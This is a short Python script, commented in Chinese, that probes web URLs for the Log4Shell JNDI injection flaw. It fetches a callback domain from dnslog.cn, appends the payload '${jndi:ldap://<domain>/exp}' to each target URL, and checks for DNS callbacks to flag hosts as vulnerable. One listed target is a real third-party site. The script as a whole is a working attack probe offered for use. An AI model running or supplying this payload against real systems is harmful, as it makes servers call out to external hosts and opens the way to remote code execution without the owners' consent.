import time

import requests
import random
def get_subfdomain():       #获取子域名
    info=[]
    random1=random.randint(0,1)
    uri="http://dnslog.cn/getdomain.php?t="+str(random1)
    res=requests.get(url=uri,timeout=99999)
    info.append(str(res.cookies['PHPSESSID']))
    info.append(res.text)
  #  print(info)
    return info
def reco_subdomain(cook):   #更新子域名
    random1 = random.randint(0,1)
    uri="http://dnslog.cn/getrecords.php?t="+str(random1)
    cookis={
        "PHPSESSID":cook
    }
    #print("cookies:%s"%(cook))
    res=requests.get(url=uri,cookies=cookis,timeout=99999)
   # print(res.text)
    return res.text
def exp(url):
    count=0
    domaininfos=get_subfdomain()
    domain=domaininfos[1]
    payload="${jndi:ldap://"+domain+"/exp}"
    while(1):
        print('[*]wait............')
        res2=requests.get(url+payload)
        recv_text=reco_subdomain(domaininfos[0])
        count=count+1
        time.sleep(4)
        if len(recv_text)!=2:
            print("[+]url:%s is vul" %(url) )
            break
        elif count==5:
            print("[-]url:%s is not vul" %(url))
            break


def main():
    lists=["https://www.baidu.com/s?wd=","XXXX"] #往此处填写URI列表
    for i in lists:
        exp(i)

if __name__ == '__main__':
    main()